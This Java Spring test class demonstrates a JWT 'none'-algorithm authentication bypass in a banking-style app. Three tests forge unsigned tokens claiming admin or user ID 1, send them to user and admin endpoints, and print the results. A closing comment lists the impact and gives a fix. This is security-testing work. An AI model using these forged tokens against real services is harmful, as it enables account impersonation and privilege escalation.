package com.securebank.exploit;

import io.jsonwebtoken.Jwts;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.web.servlet.MockMvc;

import java.util.Base64;
import java.util.Date;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * EXPLOIT TEST: JWT Algorithm Confusion (CWE-347)
 * Location: JwtTokenProvider.validateToken()
 *
 * This test demonstrates that the JWT validation accepts tokens with "none" algorithm,
 * allowing attackers to forge authentication tokens without knowing the secret key.
 */
@SpringBootTest
@AutoConfigureMockMvc
public class JWTAlgorithmConfusionExploitTest {

    @Autowired
    private MockMvc mockMvc;

    /**
     * TEST 1: Create JWT with "none" Algorithm
     * Demonstrates that validation accepts unsigned tokens
     */
    @Test
    public void testJWTAlgorithmConfusion_NoneAlgorithm() throws Exception {
        // EXPLOIT: Create a JWT with "none" algorithm (no signature)
        // This bypasses signature validation entirely

        // Craft header with alg: "none"
        String header = "{\"alg\":\"none\",\"typ\":\"JWT\"}";
        String payload = "{\"sub\":\"999\",\"username\":\"admin_fake\",\"tenantId\":1,\"role\":\"ADMIN\"," +
                "\"iat\":" + (System.currentTimeMillis() / 1000) + "," +
                "\"exp\":" + ((System.currentTimeMillis() / 1000) + 86400) + "}";

        String encodedHeader = Base64.getUrlEncoder().withoutPadding()
                .encodeToString(header.getBytes());
        String encodedPayload = Base64.getUrlEncoder().withoutPadding()
                .encodeToString(payload.getBytes());

        // Create token with no signature (note the trailing dot with empty signature)
        String forgedToken = encodedHeader + "." + encodedPayload + ".";

        System.out.println("Forged JWT with 'none' algorithm: " + forgedToken);

        try {
            // Try to use the forged token
            mockMvc.perform(get("/api/users/me")
                            .header("Authorization", "Bearer " + forgedToken))
                    .andDo(result -> {
                        System.out.println("Status: " + result.getResponse().getStatus());
                        System.out.println("Response: " + result.getResponse().getContentAsString());
                    });

            // If this succeeds, we've successfully authenticated as a fake admin user!
        } catch (Exception e) {
            System.out.println("Token rejected (expected in secure implementation): " + e.getMessage());
        }
    }

    /**
     * TEST 2: Forge Admin Token
     * Create a token claiming to be an admin without the secret key
     */
    @Test
    public void testJWTAlgorithmConfusion_ForgeAdminToken() throws Exception {
        // EXPLOIT: Forge a token with admin privileges
        long now = System.currentTimeMillis();

        // Manually create JWT parts
        String header = Base64.getUrlEncoder().withoutPadding()
                .encodeToString("{\"alg\":\"none\",\"typ\":\"JWT\"}".getBytes());

        String payload = Base64.getUrlEncoder().withoutPadding()
                .encodeToString(String.format(
                        "{\"sub\":\"666\",\"username\":\"forged_admin\",\"tenantId\":1," +
                                "\"role\":\"ADMIN\",\"iat\":%d,\"exp\":%d}",
                        now / 1000, (now / 1000) + 86400
                ).getBytes());

        String forgedAdminToken = header + "." + payload + ".";

        System.out.println("Forged Admin Token: " + forgedAdminToken);

        // Try to access admin endpoint with forged token
        try {
            mockMvc.perform(get("/api/admin/users")
                            .header("Authorization", "Bearer " + forgedAdminToken))
                    .andDo(result -> {
                        if (result.getResponse().getStatus() == 200) {
                            System.out.println("SUCCESS: Accessed admin endpoint with forged token!");
                            System.out.println("Retrieved data: " + result.getResponse().getContentAsString());
                        }
                    });
        } catch (Exception e) {
            System.out.println("Admin access denied: " + e.getMessage());
        }
    }

    /**
     * TEST 3: Manipulate User ID in Token
     * Change userId in an existing token to impersonate other users
     */
    @Test
    public void testJWTAlgorithmConfusion_ImpersonateUser() throws Exception {
        // EXPLOIT: Create token impersonating user with ID 1
        String header = Base64.getUrlEncoder().withoutPadding()
                .encodeToString("{\"alg\":\"none\",\"typ\":\"JWT\"}".getBytes());

        // Claim to be user ID 1 (typically the first/admin user)
        long now = System.currentTimeMillis();
        String payload = Base64.getUrlEncoder().withoutPadding()
                .encodeToString(String.format(
                        "{\"sub\":\"1\",\"username\":\"admin\",\"tenantId\":1," +
                                "\"role\":\"ADMIN\",\"iat\":%d,\"exp\":%d}",
                        now / 1000, (now / 1000) + 86400
                ).getBytes());

        String impersonationToken = header + "." + payload + ".";

        System.out.println("Impersonation Token: " + impersonationToken);

        // Try to access user 1's data
        mockMvc.perform(get("/api/users/me")
                        .header("Authorization", "Bearer " + impersonationToken))
                .andDo(result -> {
                    System.out.println("Impersonation attempt status: " + result.getResponse().getStatus());
                    System.out.println("Response: " + result.getResponse().getContentAsString());
                });
    }

    /**
     * SECURITY IMPACT:
     * - Complete authentication bypass
     * - Attacker can forge tokens for any user
     * - Can elevate privileges to admin
     * - Can impersonate any user in the system
     * - No need to know the JWT secret key
     * - Audit logs will show actions from forged user IDs
     *
     * FIX: Explicitly reject tokens with "none" algorithm:
     * Jwts.parserBuilder()
     *     .setSigningKey(secretKey)
     *     .requireAlgorithm(SignatureAlgorithm.HS512.getValue())
     *     .build()
     *     .parseClaimsJws(token);
     */
}
